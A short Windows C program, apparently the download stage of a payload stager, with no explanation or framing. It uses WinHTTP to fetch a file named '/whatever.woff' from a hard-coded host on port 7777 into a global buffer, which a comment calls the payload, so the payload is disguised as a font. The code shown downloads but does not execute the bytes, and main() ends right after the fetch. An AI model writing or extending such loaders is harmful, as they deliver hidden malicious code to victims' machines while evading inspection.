#include <windows.h>  
#include <winhttp.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

// adjust size to the expected payload size
unsigned char buf[1]; 

DWORD dl_to_buffer(const wchar_t* host, INTERNET_PORT port, const wchar_t* path, unsigned char* outBuf, DWORD outBufSize)
{
    DWORD counter = 0;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    hSession = WinHttpOpen(L"WinHTTP C Client/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, host, port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect,
            L"GET",
            path,              
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);      
    }         

    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (!bResults) {
        goto cleanup;
    }

    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            break;
        }

        if (dwSize == 0) {
            break;
        }

        char* pszOutBuffer = (char*)malloc(dwSize + 1);
        if (!pszOutBuffer) {
            break;
        }

        ZeroMemory(pszOutBuffer, dwSize + 1);

        dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
            free(pszOutBuffer);
            break;
        }

        for (DWORD i = 0; i < dwDownloaded; i++) {
            if (counter >= outBufSize) {
                break;
            }
            outBuf[counter++] = (unsigned char)pszOutBuffer[i];
        }

        free(pszOutBuffer);

        if (dwDownloaded == 0) {
            break;
        }

    } while (dwSize > 0);

cleanup:
    if (hRequest) { WinHttpCloseHandle(hRequest); }
    if (hConnect) { WinHttpCloseHandle(hConnect); }
    if (hSession) { WinHttpCloseHandle(hSession); }

    return counter;
}

int main() {
    DWORD bytesRead = dl_to_buffer(L"192.168.10.10", 7777, L"/whatever.woff", buf, sizeof(buf));
    SIZE_T buffSize = bytesRead;

    return 0;
}
